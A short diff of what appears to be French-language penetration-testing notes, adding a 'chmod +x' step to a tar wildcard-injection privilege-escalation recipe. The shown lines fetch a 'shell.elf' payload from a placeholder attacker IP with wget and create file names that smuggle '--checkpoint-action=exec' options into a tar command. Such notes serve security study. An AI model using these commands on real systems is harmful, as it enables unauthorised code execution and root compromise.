@@ -224,6 +224,7 @@ python -m http.server
 wget http://IP:8000/shell.elf
 touch /home/user/--checkpoint=1
 touch /home/user/--checkpoint-action=exec=shell.elf
+chmod +x shell.elf
 ```
 
 [Attaquant]
